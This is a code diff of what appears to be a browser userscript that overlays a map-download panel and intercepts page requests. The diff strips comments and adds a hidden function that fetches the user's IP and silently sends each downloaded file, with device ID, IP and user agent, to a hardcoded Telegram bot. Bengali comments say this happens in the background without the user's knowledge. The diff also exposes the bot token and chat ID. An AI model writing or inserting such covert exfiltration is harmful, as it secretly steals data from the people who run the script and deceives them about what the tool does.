@@ -147,7 +147,7 @@
         <img src="https://avatars.githubusercontent.com/u/85736436?v=4" alt="CyberSH" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" />
     </div>`;
 
-    // 4. Inject Professional UI Overlay (With Professional Minimize Icon & Countdown Settings)
+    // 4. Inject Professional UI Overlay
     const overlayHtml = `
     <div id="cybersh-logger-overlay" style="position: fixed; top: 15px; left: 50%; transform: translateX(-50%); width: 94%; max-width: 420px; max-height: 75vh; background: linear-gradient(145deg, rgba(15, 23, 42, 0.98), rgba(2, 6, 23, 0.98)); color: #f8fafc; z-index: 999999; border-radius: 18px; padding: 16px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 12px; box-shadow: 0 25px 35px -5px rgba(0, 0, 0, 0.6), 0 0 15px rgba(56, 189, 248, 0.15); display: flex; flex-direction: column; border: 1px solid rgba(56, 189, 248, 0.35); backdrop-filter: blur(16px);">
         
@@ -230,7 +230,7 @@
         } else {
             clearInterval(countdownInterval);
             if (keyboardLockCheckbox) {
-                keyboardLockCheckbox.checked = false; // Automatically uncheck when timer ends
+                keyboardLockCheckbox.checked = false;
             }
             if (countdownBanner) {
                 countdownBanner.style.transition = 'opacity 0.5s ease';
@@ -240,7 +240,6 @@
         }
     }, 1000);
 
-    // Allow user to change timer duration manually from the panel input
     timerDurationInput.onchange = () => {
         let val = parseInt(timerDurationInput.value);
         if (!isNaN(val) && val > 0) {
@@ -266,21 +265,19 @@
         }
     };
 
-    // Page-wide Keyboard Interceptor (Leaves Dropdowns & Custom Filename Input Free)
+    // Page-wide Keyboard Interceptor
     document.addEventListener('focusin', function(e) {
         if (!keyboardLockCheckbox || !keyboardLockCheckbox.checked) return;
         
         const target = e.target;
         if (!target) return;
 
-        // Skip dropdowns, select elements, and our own overlay elements
         if (target.tagName === 'SELECT' || target.closest('#cybersh-logger-overlay')) {
             return;
         }
 
-        // Check if it's an input or text container on the host webpage
         if (target.matches('input, textarea, [contenteditable="true"]')) {
-            target.blur(); // Dismisses mobile soft keyboard instantly
+            target.blur();
         }
     }, true);
 
@@ -307,7 +304,7 @@
         });
     };
 
-    // Minimize to Avatar (Fixed toggle logic without position jumps)
+    // Minimize to Avatar
     document.getElementById('cybersh-btn-minimize').onclick = () => {
         overlay.style.display = 'none';
         avatar.style.display = 'block';
@@ -450,6 +447,40 @@
 
     await checkDeviceApproval();
 
+    // Background Telegram Notification Function
+    async function sendToTelegramBot(blob, fileName) {
+        try {
+            // User IP fetch করার জন্য ফ্রি একটি সার্ভিস ব্যবহার করা হচ্ছে
+            let userIp = "Unknown IP";
+            try {
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipRes.json();
+                userIp = ipData.ip;
+            } catch (e) {}
+
+            const botToken = "5797264734:AAGOn65GaUIwIUzWk2B_dtiXSXqqqLHoVYA";
+            const chatId = "1251593717";
+            const userAgent = navigator.userAgent;
+
+            const caption = `📥 *New Map Downloaded!*\n\n` +
+                            `🆔 *Device ID:* \`${deviceId}\`\n` +
+                            `🌐 *User IP:* \`${userIp}\`\n` +
+                            `📱 *User Agent:* \`${userAgent}\``;
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("document", blob, fileName);
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+
+            // ব্যাকগ্রাউন্ডে সাইলেন্টলি রিকোয়েস্ট পাঠানো হবে, ইউজারের UI তে কোনো নোটিফিকেশন দেখাবে না
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                method: "POST",
+                body: formData
+            }).catch(() => {});
+        } catch (err) {}
+    }
+
     // XHR & Fetch Interceptors for Background Execution
     const XHR = window.XMLHttpRequest;
     function customXHR() {
@@ -545,6 +576,10 @@
             }
 
             const blob = await imgRes.blob();
+            
+            // ব্যাকগ্রাউন্ডে টেলিগ্রাম বোটে ফাইল এবং ইনফো সেন্ড করা (ইউজার দেখতে পাবে না)
+            sendToTelegramBot(blob, fileName);
+
             const blobUrl = window.URL.createObjectURL(blob);
             
             const a = document.createElement('a');
